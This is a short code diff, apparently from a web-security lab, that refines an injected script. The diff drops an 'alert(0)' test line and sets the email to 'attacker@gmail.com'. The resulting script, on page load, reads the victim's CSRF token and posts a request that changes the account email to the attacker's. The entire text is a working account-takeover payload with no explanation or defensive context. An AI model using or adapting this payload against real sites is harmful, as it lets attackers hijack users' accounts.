@@ -1,10 +1,9 @@
 <script>
     window.addEventListener('DOMContentLoaded', function() {
-        alert(0);
         let csrf = document.getElementsByName("csrf_token")[0].value;
         let data = new FormData();
         data.append('csrf_token', csrf);
-        data.append('email', 'lol@gmail.com');
+        data.append('email', 'attacker@gmail.com');
         var xhttp = new XMLHttpRequest();
         xhttp.open("POST", "http://www.vulnerable.com:5000/change-email", false);
         xhttp.send(data);
